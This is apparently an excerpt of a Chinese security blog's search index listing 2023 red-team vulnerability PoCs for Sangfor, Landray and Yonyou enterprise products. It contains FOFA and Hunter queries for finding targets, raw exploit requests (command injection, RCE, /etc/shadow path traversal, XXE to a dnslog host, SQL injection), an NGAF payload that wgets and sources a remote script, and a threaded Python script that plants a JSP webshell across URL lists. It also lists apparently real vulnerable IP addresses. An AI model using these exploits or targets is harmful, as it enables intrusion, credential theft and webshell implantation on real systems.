clsMode=cls_mode_login%0Als%0A\u0026index=index\u0026log_type=report\u0026loginType=account\u0026page=login\u0026rnd=0\u0026userID=admin\u0026userPsw=123 ","date":"2023-12-08","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw"],"title":"深信服 应用交付管理系统 login 远程命令执行漏洞","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"SANGFOR终端检测响应平台 - 任意用户免密登录,前台RCE ","date":"2023-12-08","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8Dsangfor%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95%E5%89%8D%E5%8F%B0rce/:1:0","tags":["2023hw漏洞"],"title":"深信服SANGFOR终端检测响应平台 - 任意用户免密登录,前台RCE","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8Dsangfor%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95%E5%89%8D%E5%8F%B0rce/"},{"categories":["2023hw漏洞"],"content":"FOFA语法 title=\"SANGFOR终端检测响应平台\" icon_hash=\"1307354852\" ","date":"2023-12-08","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8Dsangfor%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95%E5%89%8D%E5%8F%B0rce/:2:0","tags":["2023hw漏洞"],"title":"深信服SANGFOR终端检测响应平台 - 任意用户免密登录,前台RCE","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8Dsangfor%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95%E5%89%8D%E5%8F%B0rce/"},{"categories":["2023hw漏洞"],"content":"鹰图搜索 web.title=\"SANGFOR终端检测响应平台\" web.icon==\"68e28d49856759ddeb91b6be3d6f7e42\" ","date":"2023-12-08","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8Dsangfor%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95%E5%89%8D%E5%8F%B0rce/:3:0","tags":["2023hw漏洞"],"title":"深信服SANGFOR终端检测响应平台 - 任意用户免密登录,前台RCE","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8Dsangfor%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95%E5%89%8D%E5%8F%B0rce/"},{"categories":["2023hw漏洞"],"content":"漏洞复现 路由后拼接/ui/login.php?user={{需要登录的用户名}} 这边以admin权限用户为例 GET /ui/login.php?user=admin HTTP/1.1 Host: {{Hostname}} ","date":"2023-12-08","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8Dsangfor%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95%E5%89%8D%E5%8F%B0rce/:4:0","tags":["2023hw漏洞"],"title":"深信服SANGFOR终端检测响应平台 - 任意用户免密登录,前台RCE","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8Dsangfor%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95%E5%89%8D%E5%8F%B0rce/"},{"categories":["2023hw漏洞"],"content":"前台RCE GET /tool/log/c.php?strip_slashes=system\u0026host=id HTTP/1.1 Host: {{Hostname}} ","date":"2023-12-08","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8Dsangfor%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95%E5%89%8D%E5%8F%B0rce/:5:0","tags":["2023hw漏洞"],"title":"深信服SANGFOR终端检测响应平台 - 任意用户免密登录,前台RCE","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8Dsangfor%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95%E5%89%8D%E5%8F%B0rce/"},{"categories":["2023hw漏洞"],"content":"深信服SG上网优化管理系统 catjs.php 任意文件读取漏洞 POST /php/catjs.php [\" ../../../../../../etc/shadow\"] ","date":"2023-12-08","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8Dsg%E4%B8%8A%E7%BD%91%E4%BC%98%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-catjs.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"深信服SG上网优化管理系统 catjs.php 任意文件读取漏洞","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8Dsg%E4%B8%8A%E7%BD%91%E4%BC%98%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-catjs.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## Fofa\rtitle=\"SANGFOR上网优化管理\" ","date":"2023-12-08","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E4%B8%8A%E7%BD%91%E4%BC%98%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-catjs.php-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"深信服上网优化管理系统 catjs.php 文件读取漏洞","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E4%B8%8A%E7%BD%91%E4%BC%98%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-catjs.php-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc POST /php/catjs.php HTTP/1.1 Host: 122.227.234.50 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 19 [\"./php/catjs.php\"] ","date":"2023-12-08","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E4%B8%8A%E7%BD%91%E4%BC%98%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-catjs.php-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"深信服上网优化管理系统 catjs.php 文件读取漏洞","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E4%B8%8A%E7%BD%91%E4%BC%98%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-catjs.php-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"深信服下一代防火墙NGAF RCE漏洞 ","date":"2023-12-08","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99ngaf-rce%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"深信服下一代防火墙NGAF RCE漏洞","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99ngaf-rce%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"POC POST /LogInOut.php HTTP/1.1 Host: Cookie: PHPSESSID=2e01d2ji93utnsb5abrcm780c2 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Connection: close Content-Length: 625 type=logged\u0026un=watchTowr;wget http://\u003chost\u003e/cmd.txt;source /virus/dcweb/webapps/cmd.txt\u0026up=0f2df0a6f151e836c8ccd1c2ea3bfbdfb7bfa0d38d438942492bd8f28f3e92939319f932f2f2add6d0d484accdc4c28269b203c4dc77c1da941fa19dae017d44d6ea8cad2572e37c485a8ebcb4bdb510cc86420a50ae45ae07daf5fe9c40fe133f3806cd8f3158ee359766e8e19c9fbbf7e888bf0d7f3952f4d083bd17cd19eb960dadec2835f6f259616f5b2e5942d3a4d1754cbd69696fae60ef18358bf5782dd5ebf377f5642e0583e630660ccac241a615ae21bfc12852a32d0367a899eb010e5d1c33669fc2e9ea3a0ecbf078c22120196a115b4038288063bf99610d3d331acb53e5c8fbd14229a4abdff83cf075a7b97a9bb9dae3586f19256f4262d5\u0026vericode=\u003ccorrect captcha\u003e Cmd.txt 有效载荷： sed -i s/Lock/\"$(id)\"/g /virus/dcweb/conf/lang/eng.utf8.lang.app.php ","date":"2023-12-08","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99ngaf-rce%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"深信服下一代防火墙NGAF RCE漏洞","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99ngaf-rce%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"深信服下一代防火墙NGAF任意文件读取漏洞 ","date":"2023-12-08","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99ngaf%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"深信服下一代防火墙NGAF任意文件读取漏洞","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99ngaf%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa: “Redirect.php?url=/LogInOut.php” \u0026\u0026 port=“85” ","date":"2023-12-08","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99ngaf%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"深信服下一代防火墙NGAF任意文件读取漏洞","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99ngaf%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"hunter: web.body=“LogInOut.php?type=logout” ","date":"2023-12-08","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99ngaf%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"深信服下一代防火墙NGAF任意文件读取漏洞","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99ngaf%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"漏洞复现 curl --insecure https://\u003chost\u003e:85/svpn_html/loadfile.php?file=/etc/./passwd -H \"y-forwarded-for: 127.0.0.1\" ","date":"2023-12-08","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99ngaf%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw漏洞"],"title":"深信服下一代防火墙NGAF任意文件读取漏洞","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99ngaf%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\rGET /src/sangforindex HTTP/1.1 Host: ip:port Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko) Accept: text/xml,application/xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Type: text/xml Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9 Connection: Keep-alive Content-Length: 135 \u003c?xml version=\"1.0\" encoding=\"utf-8\" ?\u003e\u003c!DOCTYPE root [\r\u003c!ENTITY rootas SYSTEM \"http://dnslog\"\u003e\r]\u003e \u0026rootas; ","date":"2023-12-08","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-sangforindex-xml-%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"深信服数据中心管理系统 sangforindex XML 实体注入漏洞","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-sangforindex-xml-%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"深信服数据中心管理系统 XML 实体注入漏洞 GET /src/sangforindex HTTP/1.1 Host: ip:port Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko) Accept: text/xml,application/xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Type: text/xml Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9 Connection: Keep-alive Content-Length: 135 \u003c?xml version=\"1.0\" encoding=\"utf-8\" ?\u003e\u003c!DOCTYPE root [ \u003c!ENTITY rootas SYSTEM \"http://dnslog\"\u003e ]\u003e \u003cxxx\u003e \u0026rootas; \u003c/xxx\u003e ","date":"2023-12-08","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-xml-%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"深信服数据中心管理系统 XML 实体注入漏洞","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-xml-%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"蓝凌云服务平台\"||(body=\"Landray\"\u0026\u0026body=\"登录系统\")||body=\"/scripts/jquery.landray.common.js\"||body=\"java.landray.com.cn\"||body=\"蓝凌软件\" ||(body=\"StylePath\" \u0026\u0026 body=\"encryptPassword\") ","date":"2023-12-08","objectID":"/%E6%B7%B1%E5%9C%B3%E5%B8%82%E8%93%9D%E5%87%8C%E8%BD%AF%E4%BB%B6%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8-ekp%E7%B3%BB%E7%BB%9F-%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"深圳市蓝凌软件股份有限公司-EKP系统-存在未授权访问漏洞","uri":"/%E6%B7%B1%E5%9C%B3%E5%B8%82%E8%93%9D%E5%87%8C%E8%BD%AF%E4%BB%B6%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8-ekp%E7%B3%BB%E7%BB%9F-%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc GET /./ui-ext/./behavior/ HTTP/1.1 Host: 47.95.115.189:8080 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=E068ECF3AC0F0D8F7DC1FA0EDC2D7F07 Connection: close ","date":"2023-12-08","objectID":"/%E6%B7%B1%E5%9C%B3%E5%B8%82%E8%93%9D%E5%87%8C%E8%BD%AF%E4%BB%B6%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8-ekp%E7%B3%BB%E7%BB%9F-%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"深圳市蓝凌软件股份有限公司-EKP系统-存在未授权访问漏洞","uri":"/%E6%B7%B1%E5%9C%B3%E5%B8%82%E8%93%9D%E5%87%8C%E8%BD%AF%E4%BB%B6%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8-ekp%E7%B3%BB%E7%BB%9F-%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"用友 GRP U8 license_check.jsp 存在SQL注入 ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B-grp-u8-license_check.jsp-%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5/:1:0","tags":["2023hw漏洞"],"title":"用友 GRP U8 license_check.jsp 存在SQL注入","uri":"/%E7%94%A8%E5%8F%8B-grp-u8-license_check.jsp-%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw漏洞"],"content":"sql注入payload ';WAITFOR DELAY '0:0:5'-- q ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B-grp-u8-license_check.jsp-%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5/:2:0","tags":["2023hw漏洞"],"title":"用友 GRP U8 license_check.jsp 存在SQL注入","uri":"/%E7%94%A8%E5%8F%8B-grp-u8-license_check.jsp-%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw漏洞"],"content":"poc GET /u8qx/license_check.jsp?kjnd=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Connection: close ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B-grp-u8-license_check.jsp-%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5/:3:0","tags":["2023hw漏洞"],"title":"用友 GRP U8 license_check.jsp 存在SQL注入","uri":"/%E7%94%A8%E5%8F%8B-grp-u8-license_check.jsp-%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw漏洞"],"content":"用友 GRP-U8 bx_historyDataCheck.jsp SQL注入漏洞 ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B-grp-u8-bx_historydatacheck.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"用友 GRP-U8 bx_historyDataCheck.jsp SQL注入漏洞","uri":"/%E7%94%A8%E5%8F%8B-grp-u8-bx_historydatacheck.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa-qeury app=“yonyou-GRP-U8” ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B-grp-u8-bx_historydatacheck.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"用友 GRP-U8 bx_historyDataCheck.jsp SQL注入漏洞","uri":"/%E7%94%A8%E5%8F%8B-grp-u8-bx_historydatacheck.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"POC POST /u8qx/bx_historyDataCheck.jsp HTTP/1.1 Host: Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 53 userName=';WAITFOR DELAY '0:0:5'--\u0026ysnd=\u0026historyFlag= ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B-grp-u8-bx_historydatacheck.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"用友 GRP-U8 bx_historyDataCheck.jsp SQL注入漏洞","uri":"/%E7%94%A8%E5%8F%8B-grp-u8-bx_historydatacheck.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"Yonyou NC RCE with file upload\rPOST /servlet/FileReceiveServlet HTTP/1.1 Host: 113.111.49.84:9081 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip Content-Length: 379  http://113.111.49.84:9081/eD65F18d.jsp?cmd=whoami URL http://113.111.49.84:9081http://113.111.49.84:8081http://118.178.189.153http://120.209.223.24:8088http://120.234.188.158:18081http://120.31.142.3:8081http://121.11.166.98:9081http://123.235.9.29:8888http://140.237.250.110:8087http://211.143.241.218:8086http://211.143.241.218:8089http://211.95.3.134:8083http://218.2.128.45:8082http://218.2.128.45:8083http://218.2.128.45:8081http://218.75.184.138:888http://218.77.62.251:8081http://218.92.16.210:88http://218.93.246.46:8888http://219.138.5.48:9090http://219.138.5.48:7070http://27.223.107.46:8087 参考 https://mp.weixin.qq.com/s/_dpnfY7EVR3lRIfZMoytWg import requests import threadpool import urllib3 import sys import argparse urllib3.disable_warnings() proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'} header = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Referer\": \"https://google.com\", } def multithreading(funcname, filename=\"url.txt\", pools=5): works = [] with open(filename, \"r\") as f: for i in f: func_params = [i.rstrip(\"\\n\")] works.append((func_params, None)) pool = threadpool.ThreadPool(pools) reqs = threadpool.makeRequests(funcname, works) [pool.putRequest(req) for req in reqs] pool.wait() def wirte_targets(vurl, filename): with open(filename, \"a+\") as f: f.write(vurl + \"\\n\") return vurl def exp(u): uploadHeader = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\", \"Content-Type\": \"multipart/form-data;\", \"Referer\": \"https://google.com\" } uploadData = \"\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x11\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x48\\x61\\x73\\x68\\x4d\\x61\\x70\\x05\\x07\\xda\\xc1\\xc3\\x16\\x60\\xd1\\x03\\x00\\x02\\x46\\x00\\x0a\\x6c\\x6f\\x61\\x64\\x46\\x61\\x63\\x74\\x6f\\x72\\x49\\x00\\x09\\x74\\x68\\x72\\x65\\x73\\x68\\x6f\\x6c\\x64\\x78\\x70\\x3f\\x40\\x00\\x00\\x00\\x00\\x00\\x0c\\x77\\x08\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x02\\x74\\x00\\x09\\x46\\x49\\x4c\\x45\\x5f\\x4e\\x41\\x4d\\x45\\x74\\x00\\x09\\x74\\x30\\x30\\x6c\\x73\\x2e\\x6a\\x73\\x70\\x74\\x00\\x10\\x54\\x41\\x52\\x47\\x45\\x54\\x5f\\x46\\x49\\x4c\\x45\\x5f\\x50\\x41\\x54\\x48\\x74\\x00\\x10\\x2e\\x2f\\x77\\x65\\x62\\x61\\x70\\x70\\x73\\x2f\\x6e\\x63\\x5f\\x77\\x65\\x62\\x78\" shellFlag = \"t0test0ls\" uploadData += shellFlag try: req1 = requests.post(u + \"/servlet/FileReceiveServlet\", headers=uploadHeader, verify=False, data=uploadData, timeout=25) if req1.status_code == 200: req3 = requests.get(u + \"/t00ls.jsp\", headers=header, verify=False, timeout=25) if req3.text.index(shellFlag) \u003e= 0: printFlag = \"[Getshell]\" + u + \"/t00ls.jsp\" + \"\\n\" print(printFlag) wirte_targets(printFlag, \"vuln.txt\") except: pass # print(printFlag, end=\"\") if __name__ == \"__main__\": if (len(sys.argv)) \u003c 2: print('useage : python' + str(sys.argv[0]) + ' -h') else: parser = argparse.ArgumentParser() parser.description = 'YONYOU UC 6.5 FILE UPLOAD!' parser.add_argument('-u', help=\"url -\u003e example [url]http://127.0.0.1[/url]\", type=str, dest='check_url') parser.add_argument('-r', help=\"url list to file\", type=str, dest='check_file') args = parser.parse_args() if args.check_url: exp(args.check_url) if (args.check_file): multithreading(exp, args.check_file, 8) ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B-nc-6.5%E7%89%88%E6%9C%AC-filereceiveservlet-%E8%B7%AF%E7%94%B1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"用友 NC 6.5版本 FileReceiveServlet 路由任意文件上传漏洞","uri":"/%E7%94%A8%E5%8F%8B-nc-6.5%E7%89%88%E6%9C%AC-filereceiveservlet-%E8%B7%AF%E7%94%B1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rbanner=\"nccloud\" || header=\"nccloud\" || (body=\"/platform/yonyou-yyy.js\" \u0026\u0026 body=\"/platform/ca/nccsign.js\") || 